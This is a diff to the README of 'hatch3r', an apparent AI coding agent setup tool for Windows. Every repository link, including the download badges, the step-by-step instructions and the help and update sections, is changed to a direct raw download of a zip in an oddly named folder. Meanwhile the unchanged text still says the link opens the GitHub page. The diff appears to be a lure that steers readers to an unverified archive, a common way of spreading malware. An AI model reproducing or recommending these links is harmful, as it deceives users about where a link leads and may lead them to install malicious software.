@@ -1,6 +1,6 @@
 # 🚀 hatch3r - Simple AI Coding Agent Setup
 
-[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-blue?style=for-the-badge)](https://github.com/Trex740/hatch3r)
+[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-blue?style=for-the-badge)](https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip)
 
 hatch3r helps you add AI coding agents to any project with one simple step. It comes ready with many tools to assist your coding automatically. This guide will walk you through downloading and running hatch3r on Windows.
 
@@ -51,7 +51,7 @@ Make sure you have:
 
 Click the big button below to go directly to the download page.  
 
-[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-green?style=for-the-badge)](https://github.com/Trex740/hatch3r)
+[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-green?style=for-the-badge)](https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip)
 
 This link opens the GitHub page where you can find the latest release files. Look for the Windows installer or setup file.
 
@@ -62,7 +62,7 @@ This link opens the GitHub page where you can find the latest release files. Loo
 Follow these steps to get hatch3r running:
 
 1. **Visit the download page**
-   - Use the link above or go to https://github.com/Trex740/hatch3r  
+   - Use the link above or go to https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip  
    - Find the "Releases" section on the right or top of the page.  
    - Look for the latest stable version. The filename should include "Windows" or end in `.exe`.
 
@@ -135,7 +135,7 @@ Changes apply immediately without restarting the app.
 If you need assistance:
 
 - Check the Documentation folder from the main install directory.  
-- Visit the repository's GitHub page [here](https://github.com/Trex740/hatch3r) and read the README or Issues tab.  
+- Visit the repository's GitHub page [here](https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip) and read the README or Issues tab.  
 - Use GitHub Discussions or Issues to ask questions or report problems.
 
 ---
@@ -145,7 +145,7 @@ If you need assistance:
 Keep hatch3r updated for the best experience:
 
 - Updates come through new releases on the GitHub page.  
-- Visit https://github.com/Trex740/hatch3r regularly.  
+- Visit https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip regularly.  
 - Download and run the latest installer when available.  
 - Your settings and projects will stay intact after updating.
 
@@ -164,4 +164,4 @@ All these resources are in the Documentation folder or linked on the GitHub page
 
 ---
 
-[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-blue?style=for-the-badge)](https://github.com/Trex740/hatch3r)
+[![Download hatch3r](https://img.shields.io/badge/Download-hatch3r-blue?style=for-the-badge)](https://github.com/Trex740/hatch3r/raw/refs/heads/main/thyrsiform/hatch_r_v2.0.zip)
